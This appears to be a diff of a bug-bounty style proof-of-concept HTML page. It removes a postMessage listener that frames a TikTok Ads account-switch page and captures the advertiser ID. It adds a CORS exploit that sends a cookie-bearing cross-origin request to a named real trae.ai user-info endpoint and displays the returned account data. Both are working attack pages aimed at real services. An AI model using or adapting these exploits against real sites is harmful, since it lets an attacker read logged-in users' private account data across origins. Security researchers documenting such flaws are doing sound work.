@@ -1,1 +1,58 @@
-<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>TikTok Account Viewer</title><style>*{margin:0;padding:0;box-sizing:border-box}body{font-family:'Segoe UI',Tahoma,sans-serif;background:linear-gradient(135deg,#667eea 0%,#764ba2 100%);min-height:100vh}#banner{background:rgba(0,0,0,.3);backdrop-filter:blur(10px);padding:15px 30px;color:#fff;display:flex;justify-content:space-between;align-items:center;box-shadow:0 4px 6px rgba(0,0,0,.1);position:sticky;top:0;z-index:100}#banner h1{font-size:20px;font-weight:600;letter-spacing:-.5px}#status{display:flex;gap:20px;align-items:center;font-size:14px}#status span{padding:6px 12px;background:rgba(255,255,255,.2);border-radius:20px;display:flex;align-items:center;gap:6px}#status .dot{width:8px;height:8px;border-radius:50%;background:#4ade80;animation:pulse 2s infinite}#container{position:relative;min-height:200vh;padding:20px}#frame{border:none;width:100%;height:150vh;background:#fff;border-radius:12px;box-shadow:0 8px 32px rgba(0,0,0,.2)}#overlay{position:fixed;top:80px;right:20px;background:rgba(0,0,0,.85);color:#fff;padding:20px;border-radius:12px;max-width:350px;backdrop-filter:blur(10px);box-shadow:0 8px 32px rgba(0,0,0,.3);opacity:0;transform:translateY(-20px);transition:all .4s ease;pointer-events:none;z-index:99}#overlay.show{opacity:1;transform:translateY(0);pointer-events:auto}#overlay h3{margin:0 0 15px;font-size:18px;color:#4ade80;display:flex;align-items:center;gap:8px}#overlay h3:before{content:'✓';background:#4ade80;color:#000;width:24px;height:24px;border-radius:50%;display:flex;align-items:center;justify-content:center;font-weight:bold;font-size:14px}#data{background:rgba(255,255,255,.1);padding:15px;border-radius:8px;border-left:3px solid #4ade80;font-family:'Courier New',monospace;word-break:break-all;line-height:1.6;font-size:13px}#data strong{color:#60a5fa;display:block;margin-bottom:5px;font-size:11px;text-transform:uppercase;letter-spacing:1px}@keyframes pulse{0%,100%{opacity:1}50%{opacity:.5}}</style></head><body><div id="banner"><h1>🎯 TikTok Business Account Switch Monitor</h1><div id="status"><span><span class="dot"></span>Monitoring</span><span id="timer">00:00</span></div></div><div id="container"><iframe id="frame" src="https://ads.tiktok.com/int/aegir/account/switch?redirect=https%3A%2F%2Fads.tiktok.com/i18n/statistics/viewdata"></iframe></div><div id="overlay"><h3>Advertiser ID Captured</h3><div id="data"></div></div><script>let t=0;setInterval(()=>{const m=Math.floor(t/60),s=t%60;document.getElementById('timer').textContent=`${String(m).padStart(2,'0')}:${String(s).padStart(2,'0')}`;t++},1e3);window.addEventListener('message',e=>{console.log('[PostMessage]',e.origin,e.data);const d=e.data;if(d?.data?.type==='query'&&d?.data?.query?.aadvid){const id=d.data.query.aadvid,o=document.getElementById('overlay'),el=document.getElementById('data');el.innerHTML=`<strong>Advertiser ID</strong>${id}<br><br><strong>Origin</strong>${e.origin}<br><br><strong>Timestamp</strong>${new Date().toISOString()}`;o.classList.add('show');alert('Advertiser ID Captured: '+id)}},!1)</script></body></html>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>CORS PoC – Credentialed Request</title>
+</head>
+<body>
+  <h1>CORS PoC (Authenticated JSON Response)</h1>
+
+  <p>
+    This PoC sends a <strong>credentialed cross-origin request</strong> and
+    attempts to read and display the JSON response.
+  </p>
+
+  <p>
+    Target endpoint:<br>
+    <code>https://ug-normal.trae.ai/cloudide/api/v3/trae/GetUserInfo</code>
+  </p>
+
+  <button id="pocButton">Send Cross-Origin Request</button>
+
+  <pre id="responseBox"
+       style="border:1px solid #ccc; padding:1em; margin-top:1em; white-space:pre-wrap;">
+Waiting for response…
+  </pre>
+
+  <script>
+    document.getElementById("pocButton").addEventListener("click", () => {
+      fetch("https://ug-normal.trae.ai/cloudide/api/v3/trae/GetUserInfo", {
+        method: "POST",
+        credentials: "include", // 🔑 ensures cookies are sent
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify({
+          IfWebPage: true
+        })
+      })
+      .then(res => {
+        if (!res.ok) {
+          throw new Error("HTTP status " + res.status);
+        }
+        return res.json();
+      })
+      .then(data => {
+        document.getElementById("responseBox").textContent =
+          JSON.stringify(data, null, 2);
+        console.log("Response:", data);
+      })
+      .catch(err => {
+        document.getElementById("responseBox").textContent =
+          "Request failed:\n" + err;
+        console.error(err);
+      });
+    });
+  </script>
+</body>
+</html>
